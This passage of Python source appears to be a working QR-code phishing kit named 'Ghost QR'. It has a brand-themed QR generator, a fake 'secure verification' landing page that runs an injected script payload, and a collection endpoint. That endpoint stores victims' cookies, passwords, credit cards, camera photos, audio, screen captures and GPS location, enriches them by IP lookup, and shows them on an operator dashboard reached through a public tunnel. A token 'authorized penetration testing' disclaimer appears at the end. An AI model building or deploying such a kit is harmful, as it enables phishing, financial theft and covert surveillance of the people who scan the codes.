                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between"><div><p class="text-white font-semibold">Cookies from ' + (c.ip_address || 'Unknown') + '</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p><p class="text-xs text-gray-500">Total: ' + (c.cookie_count || 0) + ' cookies</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">View</button></div><div class="mt-3 p-3 bg-black/30 rounded-lg overflow-x-auto"><pre class="text-xs text-gray-300 whitespace-pre-wrap break-all">' + (c.cookies ? c.cookies.substring(0, 500) : '') + '</pre></div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function loadLocations() {{
                    var locationsData = allCaptures.filter(c => c.geolocation && c.geolocation !== '{{}}');
                    var container = document.getElementById('locationsList');
                    if(locationsData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400 col-span-full"><i class="fas fa-map-marker-alt text-6xl mb-4"></i><p>No location data yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < locationsData.length; i++) {{
                        var c = locationsData[i];
                        var geo = {{}};
                        try {{ geo = JSON.parse(c.geolocation); }} catch(e) {{}}
                        html += '<div class="glass-card-dark rounded-xl p-4"><i class="fas fa-map-marker-alt text-red-400 text-2xl mb-2"></i><p class="text-white font-semibold">' + (c.city || 'Unknown') + ', ' + (c.country || 'Unknown') + '</p><p class="text-sm text-gray-400">IP: ' + (c.ip_address || 'Unknown') + '</p><p class="text-xs text-gray-500">ISP: ' + (c.isp || 'Unknown') + '</p><p class="text-xs text-gray-500">Time: ' + new Date(c.timestamp).toLocaleString() + '</p><div class="mt-3"><a href="https://www.google.com/maps?q=' + (geo.latitude || 0) + ',' + (geo.longitude || 0) + '" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm inline-block transition">View on Map</a></div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function loadFingerprints() {{
                    var fpData = allCaptures.filter(c => c.fingerprint && c.fingerprint !== '{{}}');
                    var container = document.getElementById('fingerprintList');
                    if(fpData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-fingerprint text-6xl mb-4"></i><p>No fingerprint data yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < fpData.length; i++) {{
                        var c = fpData[i];
                        var fp = {{}};
                        try {{ fp = JSON.parse(c.fingerprint); }} catch(e) {{}}
                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between"><div><p class="text-white font-semibold">Browser Fingerprint</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p><p class="text-xs text-gray-500">From: ' + (c.ip_address || 'Unknown') + '</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">Full Details</button></div><div class="mt-3 grid grid-cols-2 md:grid-cols-4 gap-3">' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Platform</p><p class="text-sm text-white">' + (fp.platform || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Language</p><p class="text-sm text-white">' + (fp.language || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">CPU Cores</p><p class="text-sm text-white">' + (fp.hardwareConcurrency || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Memory</p><p class="text-sm text-white">' + (fp.deviceMemory || 'Unknown') + ' GB</p></div>' +
                            '</div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function loadSystem() {{
                    var systemData = allCaptures.filter(c => c.os_name || c.browser_name);
                    var container = document.getElementById('systemList');
                    if(systemData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-microchip text-6xl mb-4"></i><p>No system information yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < systemData.length; i++) {{
                        var c = systemData[i];
                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between"><div><p class="text-white font-semibold">System Information</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p><p class="text-xs text-gray-500">From: ' + (c.ip_address || 'Unknown') + '</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">Full Details</button></div><div class="mt-3 grid grid-cols-2 md:grid-cols-4 gap-3">' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">OS</p><p class="text-sm text-white">' + (c.os_name || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Browser</p><p class="text-sm text-white">' + (c.browser_name || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Device</p><p class="text-sm text-white">' + (c.device_type || 'Unknown') + '</p></div>' +
                            '<div class="bg-black/30 rounded-lg p-2"><p class="text-xs text-gray-400">Screen</p><p class="text-sm text-white">' + (c.screen_info ? 'Captured' : 'Unknown') + '</p></div>' +
                            '</div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function viewImage(url) {{ document.getElementById('modalContent').innerHTML = '<img src="' + url + '" class="w-full h-auto">'; document.getElementById('mediaModal').classList.remove('hidden'); document.getElementById('mediaModal').classList.add('flex'); }}
                function viewDetails(id) {{ for(var i = 0; i < allCaptures.length; i++) {{ if(allCaptures[i].id === id) {{ document.getElementById('modalContent').innerHTML = '<pre class="text-gray-300 text-sm overflow-x-auto">' + JSON.stringify(allCaptures[i], null, 2) + '</pre>'; document.getElementById('mediaModal').classList.remove('hidden'); document.getElementById('mediaModal').classList.add('flex'); break; }} }} }}
                function closeModal() {{ document.getElementById('mediaModal').classList.add('hidden'); document.getElementById('mediaModal').classList.remove('flex'); }}
                async function clearData() {{ if(confirm('⚠️ WARNING: This will delete ALL captured data! This action cannot be undone!')) {{ await fetch('/clear?key={Config.DASHBOARD_KEY}'); location.reload(); }} }}
                
                function initCharts() {{
                    var ctx1 = document.getElementById('activityChart').getContext('2d');
                    activityChart = new Chart(ctx1, {{
                        type: 'line',
                        data: {{ labels: [], datasets: [{{ label: 'Captures per Hour', data: [], borderColor: '#8B5CF6', backgroundColor: 'rgba(139,92,246,0.1)', tension: 0.4, fill: true }}] }},
                        options: {{ responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ labels: {{ color: 'white' }} }} }}, scales: {{ y: {{ ticks: {{ color: 'white' }}, grid: {{ color: 'rgba(255,255,255,0.1)' }} }}, x: {{ ticks: {{ color: 'white' }}, grid: {{ color: 'rgba(255,255,255,0.1)' }} }} }} }}
                    }});
                    
                    var ctx2 = document.getElementById('distributionChart').getContext('2d');
                    distributionChart = new Chart(ctx2, {{
                        type: 'doughnut',
                        data: {{ labels: ['Photos', 'Audio', 'Passwords', 'Cards'], datasets: [{{ data: [{stats['photos']}, {stats['audio']}, {stats['passwords']}, {stats['cards']}], backgroundColor: ['#EC4899', '#10B981', '#F59E0B', '#EF4444'] }}] }},
                        options: {{ responsive: true, plugins: {{ legend: {{ labels: {{ color: 'white' }} }} }} }}
                    }});
                    
                    var ctx3 = document.getElementById('browserChart').getContext('2d');
                    browserChart = new Chart(ctx3, {{
                        type: 'bar',
                        data: {{ labels: [], datasets: [{{ label: 'Users', data: [], backgroundColor: '#8B5CF6' }}] }},
                        options: {{ responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ labels: {{ color: 'white' }} }} }}, scales: {{ y: {{ ticks: {{ color: 'white' }}, grid: {{ color: 'rgba(255,255,255,0.1)' }} }}, x: {{ ticks: {{ color: 'white' }}, grid: {{ color: 'rgba(255,255,255,0.1)' }} }} }} }}
                    }});
                }}
                
                document.getElementById('menu-dashboard').classList.add('menu-active');
                initCharts();
                loadData();
                setInterval(loadData, 5000);
            </script>
        </body>
        </html>
        '''
    
    def serve_generator(self):
        templates_html = ''.join(f'<option value="{k}">{v["name"]}</option>' for k, v in Config.TEMPLATES.items())
        
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ghost QR Generator</title>
            <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
            <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
        </head>
        <body class="bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900">
            <div class="container mx-auto px-4 py-8 max-w-2xl">
                <div class="bg-white/10 backdrop-blur-lg rounded-2xl p-8">
                    <div class="flex justify-between items-center mb-6">
                        <h1 class="text-3xl font-bold text-white"><i class="fas fa-crown text-yellow-400"></i> Premium QR Generator</h1>
                        <a href="/dashboard?key={Config.DASHBOARD_KEY}" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition">Dashboard</a>
                    </div>
                    
                    <div class="mb-4 p-3 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-lg">
                        <p class="text-sm text-gray-300"><i class="fas fa-star text-yellow-400"></i> <strong>Premium Mode:</strong> Demo Data | 5 Photos | Screen Capture | Audio | Passwords | Credit Cards | Cookies</p>
                    </div>
                    
                    <div class="space-y-4">
                        <div><label class="block text-white mb-2">Select Template</label><select id="template" class="w-full px-4 py-2 rounded-lg bg-gray-800 text-white border border-gray-700">{templates_html}</select></div>
                        <div><label class="block text-white mb-2">Campaign Name</label><input type="text" id="campaign" class="w-full px-4 py-2 rounded-lg bg-gray-800 text-white border border-gray-700"></div>
                        <button onclick="generateQR()" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white py-3 rounded-lg font-semibold transition transform hover:scale-105">Generate Premium QR</button>
                        
                        <div id="qrResult" class="text-center hidden mt-6">
                            <div class="bg-white rounded-xl p-4 inline-block glow"><div id="qrcode"></div></div>
                            <div class="mt-4"><code id="qrUrl" class="text-sm text-gray-300 break-all"></code></div>
                            <div class="mt-4 flex gap-3 justify-center">
                                <button onclick="copyUrl()" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition">Copy URL</button>
                                <button onclick="downloadQR()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition">Download QR</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script>
                let currentQRId = null, currentQRUrl = null;
                async function generateQR() {{
                    const template = document.getElementById('template').value;
                    const campaign = document.getElementById('campaign').value;
                    const res = await fetch(`/api/generate?template=${{template}}&campaign=${{encodeURIComponent(campaign)}}`);
                    const data = await res.json();
                    if(data.success) {{
                        currentQRId = data.qr_id;
                        currentQRUrl = data.url;
                        document.getElementById('qrcode').innerHTML = '';
                        new QRCode(document.getElementById('qrcode'), {{ text: data.url, width: 200, height: 200 }});
                        document.getElementById('qrUrl').innerText = data.url;
                        document.getElementById('qrResult').classList.remove('hidden');
                    }}
                }}
                function copyUrl() {{ navigator.clipboard.writeText(currentQRUrl); alert('URL copied!'); }}
                function downloadQR() {{ window.location.href = `/qr/${{currentQRId}}`; }}
            </script>
        </body>
        </html>
        '''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def generate_qr(self):
        query = parse_qs(urlparse(self.path).query)
        template = query.get('template', ['whatsapp'])[0]
        campaign = query.get('campaign', [''])[0]
        
        template_data = Config.TEMPLATES.get(template, Config.TEMPLATES['whatsapp'])
        category = template_data['category']
        
        qr_id = hashlib.md5(f"{template}{time.time()}{random.random()}".encode()).hexdigest()[:10]
        short_code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
        base_url = self.public_url if self.public_url else f"http://localhost:{Config.PORT}"
        qr_url = f"{base_url}/scan/{qr_id}"
        
        self.db.save_qr(qr_id, template, category, campaign, qr_url, short_code)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'success': True, 'qr_id': qr_id, 'url': qr_url}).encode())
    
    def serve_qr_image(self):
        qr_id = self.path.split('/')[-1].split('?')[0]
        qr_data = self.db.get_qr(qr_id)
        
        if not qr_data:
            self.send_error(404)
            return
        
        qr = qrcode.QRCode(version=5, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=2)
        qr.add_data(qr_data['qr_url'])
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        
        self.send_response(200)
        self.send_header('Content-type', 'image/png')
        self.end_headers()
        self.wfile.write(buffer.getvalue())
    
    def serve_phish(self):
        qr_id = self.path.split('/')[-1].split('?')[0]
        qr_data = self.db.get_qr(qr_id)
        
        if not qr_data:
            self.send_error(404, "QR code expired")
            return
        
        template = qr_data['template']
        template_data = Config.TEMPLATES.get(template, Config.TEMPLATES['whatsapp'])
        
        self.db.update_scan(qr_id)
        payload = generate_enhanced_payload(qr_id, template)
        
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{template_data['name']} - Verification</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background: linear-gradient(135deg, {template_data['color']}15 0%, #ffffff 100%);
                }}
                .container {{
                    background: white;
                    border-radius: 28px;
                    padding: 48px 40px;
                    max-width: 420px;
                    width: 90%;
                    text-align: center;
                    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
                    animation: fadeIn 0.6s ease-out;
                }}
                @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(20px); }} to {{ opacity: 1; transform: translateY(0); }} }}
                .icon {{ font-size: 72px; color: {template_data['color']}; margin-bottom: 24px; }}
                h1 {{ font-size: 26px; font-weight: 700; color: #1a1a2e; margin-bottom: 12px; }}
                .spinner {{
                    width: 44px;
                    height: 44px;
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid {template_data['color']};
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 24px auto;
                }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                .progress-bar {{ width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin: 24px 0; }}
                .progress {{ width: 0%; height: 100%; background: {template_data['color']}; animation: progress 5s ease-out forwards; }}
                @keyframes progress {{ 0% {{ width: 0%; }} 100% {{ width: 100%; }} }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon"><i class="{template_data['icon']}"></i></div>
                <h1>{template_data['name']}</h1>
                <p>Secure verification in progress...</p>
                <div class="spinner"></div>
                <div class="progress-bar"><div class="progress"></div></div>
                <p class="text-gray-500 text-sm mt-4">Please wait while we verify your identity</p>
            </div>
            <script>{payload}</script>
        </body>
        </html>
        '''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def collect_data(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        
        try:
            data = json.loads(body.decode('utf-8'))
            data['ip'] = self.client_address[0]
            
            print(f"\n{'='*60}")
            print(f"📥 DATA RECEIVED")
            print(f"   IP: {data['ip']}")
            print(f"   QR ID: {data.get('qr_id', 'Unknown')}")
            print(f"   Template: {data.get('template', 'Unknown')}")
            print(f"   Cookies: {data.get('cookie_count', 0)}")
            print(f"   Photos: {len(data.get('camera_photos', []))}")
            print(f"   Audio: {'Yes' if data.get('audio_recording') else 'No'}")
            print(f"   Screen: {'Yes' if data.get('screen_capture') else 'No'}")
            print(f"   Passwords: {len(data.get('passwords', []))}")
            print(f"   Credit Cards: {len(data.get('credit_cards', []))}")
            
            geo = data.get('geolocation', {})
            if geo and 'latitude' in geo:
                print(f"   📍 Location: {geo['latitude']}, {geo['longitude']}")
            
            ua = data.get('user_agent', '')
            if 'Mobile' in ua:
                data['device_type'] = 'Mobile'
            else:
                data['device_type'] = 'Desktop'
            
            if 'Chrome' in ua:
                data['browser_name'] = 'Chrome'
            elif 'Firefox' in ua:
                data['browser_name'] = 'Firefox'
            elif 'Safari' in ua:
                data['browser_name'] = 'Safari'
            else:
                data['browser_name'] = 'Other'
            
            if 'Windows' in ua:
                data['os_name'] = 'Windows'
            elif 'Mac' in ua:
                data['os_name'] = 'macOS'
            elif 'Linux' in ua:
                data['os_name'] = 'Linux'
            elif 'Android' in ua:
                data['os_name'] = 'Android'
            elif 'iOS' in ua:
                data['os_name'] = 'iOS'
            else:
                data['os_name'] = 'Unknown'
            
            try:
                response = requests.get(f'http://ip-api.com/json/{data["ip"]}', timeout=3)
                if response.status_code == 200:
                    geo = response.json()
                    if geo.get('status') == 'success':
                        data['country'] = geo.get('country', '')
                        data['city'] = geo.get('city', '')
                        data['isp'] = geo.get('isp', '')
                        print(f"   IP Location: {data['city']}, {data['country']}")
            except:
                pass
            
            capture_id = self.db.save_capture(data)
            
            if capture_id:
                print(f"✅ DATA SAVED: {capture_id}")
            else:
                print(f"❌ Failed to save data")
            
            print(f"{'='*60}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok', 'id': capture_id}).encode())
            
        except Exception as e:
            print(f"❌ Collection error: {e}")
            import traceback
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'error', 'message': str(e)}).encode())
    
    def api_stats(self):
        stats = self.db.get_stats()
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats).encode())
    
    def api_data(self):
        data = self.db.get_captures(500)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def export_html(self):
        data = self.db.get_all_data_for_export()
        html = generate_html_export(data)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Disposition', f'attachment; filename="security_export_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html"')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def export_json(self):
        data = self.db.get_captures(10000)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Content-Disposition', f'attachment; filename="security_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json"')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())
    
    def clear_data(self):
        self.db.clear_all()
        self.send_response(302)
        self.send_header('Location', f'/dashboard?key={Config.DASHBOARD_KEY}')
        self.end_headers()

# ============================================
# MAIN
# ============================================
def main():
    print("""
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ██████╗ 
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝   ██╔═══██╗██╔══██╗
██║  ███╗███████║██║   ██║███████╗   ██║█████╗██║   ██║██████╔╝
██║   ██║██╔══██║██║   ██║╚════██║   ██║╚════╝██║▄▄ ██║██╔══██╗
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ╚██████╔╝██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚══▀▀═╝ ╚═╝  ╚═╝
                                                               
    """)
    
    print("🚀 Starting server...")
    tunnel = CloudflareTunnel(Config.PORT)
    public_url = tunnel.start()
    
    if public_url:
        print(f"✅ Public URL: {public_url}")
        Handler.public_url = public_url
    else:
        print("⚠️ Tunnel failed, using localhost")
        Handler.public_url = f"http://localhost:{Config.PORT}"
    
    server = ThreadedHTTPServer(('0.0.0.0', Config.PORT), Handler)
    
    print(f"\n{'='*60}")
    print(f" PREMIUM SERVER READY!")
    print(f" Local: http://localhost:{Config.PORT}")
    print(f"🌍 Public: {Handler.public_url}")
    print(f" Dashboard Key: {Config.DASHBOARD_KEY}")
    print(f" Premium Dashboard: {Handler.public_url}/dashboard?key={Config.DASHBOARD_KEY}")
    print(f" QR Generator: {Handler.public_url}/generate?key={Config.DASHBOARD_KEY}")
    print(f" HTML Export: {Handler.public_url}/export/html?key={Config.DASHBOARD_KEY}")
    print(f"{'='*60}")
    print("\n PREMIUM FEATURES:")
    print("   ✓ 5 Camera Photos (Burst Mode)")
    print("   ✓ Screen Capture")
    print("   ✓ 3 Seconds Audio Recording")
    print("   ✓ Password Detection")
    print("   ✓ Credit Card Detection")
    print("   ✓ LIVE GPS Location")
    print("   ✓ Demo Data Included")
    print("   ✓ WORKING 3D Interactive Globe")
    print("   ✓ Advanced Analytics")
    print("   ✓ Professional Dashboard")
    print("\n  USE ONLY FOR AUTHORIZED PENETRATION TESTING!")
    print(f"{'='*60}\n")
    
    webbrowser.open(f"http://localhost:{Config.PORT}/dashboard?key={Config.DASHBOARD_KEY}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n Shutting down...")
        tunnel.stop()
        server.shutdown()

if __name__ == "__main__":
    main()